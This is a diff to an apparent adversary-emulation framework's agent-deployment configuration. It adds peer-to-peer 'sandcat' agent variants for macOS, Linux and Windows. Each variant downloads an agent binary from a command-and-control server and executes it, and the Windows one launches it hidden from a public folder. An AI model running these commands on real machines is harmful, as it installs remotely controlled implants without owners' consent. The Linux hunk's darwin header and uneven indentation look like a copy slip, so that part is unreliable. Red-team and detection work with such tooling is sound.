@@ -32,6 +32,12 @@
               curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > sandcat.go;
               chmod +x sandcat.go;
               ./sandcat.go -c2 GIST -v
+          - description: Deploy as a P2P agent with known peers included in compiled agent
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > sandcat.go;
+              chmod +x sandcat.go;
+              ./sandcat.go -server $server -listenP2P -v
     linux:
       sh:
         command: |
@@ -56,6 +62,12 @@
               curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > sandcat.go;
               chmod +x sandcat.go;
               ./sandcat.go -c2 GIST -v
+          - description: Deploy as a P2P agent with known peers included in compiled agent
+              command: |
+                server="#{app.contact.http}";
+                curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > sandcat.go;
+                chmod +x sandcat.go;
+                ./sandcat.go -server $server -listenP2P -v
     windows:
       psh:
         command: |
@@ -70,3 +82,19 @@
           rm -force "C:\Users\Public\$name.exe" -ea ignore;
           [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
           Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+      variations:
+        - description: Deploy as a P2P agent with known peers included in compiled agent
+          command: |
+            $server="#{app.contact.http}";
+            $url="$server/file/download";
+            $wc=New-Object System.Net.WebClient;
+            $wc.Headers.add("platform","windows");
+            $wc.Headers.add("file","sandcat.go");
+            $wc.Headers.add("gocat-extensions","proxy_http");
+            $wc.Headers.add("includeProxyPeers","HTTP");
+            $data=$wc.DownloadData($url);
+            $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
+            get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
+            rm -force "C:\Users\Public\$name.exe" -ea ignore;
+            [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
+            Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red -listenP2P -v" -WindowStyle hidden;
